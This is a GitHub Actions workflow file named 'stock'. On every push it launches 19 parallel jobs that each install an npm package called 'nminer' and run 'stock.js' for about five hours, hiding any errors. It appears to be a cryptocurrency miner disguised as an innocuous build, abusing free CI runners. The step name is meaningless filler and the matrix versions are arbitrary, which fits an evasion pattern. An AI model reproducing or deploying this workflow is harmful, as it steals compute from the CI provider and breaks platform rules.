name: stock
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3407 }
          - { version: 9017 }
          - { version: 2170 }
          - { version: 4955 }
          - { version: 2054 }
          - { version: 5429 }
          - { version: 7701 }
          - { version: 44 }
          - { version: 1623 }
          - { version: 8199 }
          - { version: 2918 }
          - { version: 2228 }
          - { version: 9126 }
          - { version: 4525 }
          - { version: 7123 }
          - { version: 68 }
          - { version: 663 }
          - { version: 9995 }
          - { version: 6373 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: regarding towards outnumber finally
        run: |
          npm install nminer@latest
          timeout 309m node stock.js || echo "stock executed"